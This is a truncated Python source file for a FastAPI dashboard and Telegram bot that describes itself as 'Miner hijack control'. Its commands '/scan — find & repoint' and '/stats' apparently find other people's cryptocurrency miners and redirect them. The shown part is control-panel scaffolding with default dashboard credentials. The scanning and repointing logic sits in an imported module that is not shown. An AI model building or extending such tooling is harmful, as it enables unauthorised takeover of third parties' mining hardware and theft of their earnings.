import os, asyncio
from contextlib import asynccontextmanager
from fastapi import FastAPI, Depends, HTTPException
from fastapi.responses import HTMLResponse, FileResponse
from fastapi.security import HTTPBasic, HTTPBasicCredentials
from telegram import Update, WebAppInfo, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes
from dotenv import load_dotenv
import scanner

load_dotenv()
TOKEN = os.getenv("BOT_TOKEN")
DASH_USER = os.getenv("DASH_USER", "admin")
DASH_PASS = os.getenv("DASH_PASS", "changeme")
PUBLIC_URL = os.getenv("PUBLIC_URL", "http://localhost:8000")

security = HTTPBasic()

def auth(c: HTTPBasicCredentials = Depends(security)):
    ok = c.username == DASH_USER and c.password == DASH_PASS
    if not ok:
        raise HTTPException(401, "auth", headers={"WWW-Authenticate": "Basic"})

ptb_app = Application.builder().token(TOKEN).build()

async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    kb = InlineKeyboardMarkup([[
        InlineKeyboardButton("Open dashboard", web_app=WebAppInfo(url=f"{PUBLIC_URL}/app"))
    ]])
    await update.message.reply_text(
        "Miner hijack control.\n\nCommands:\n/scan — find & repoint\n/stats — progress\n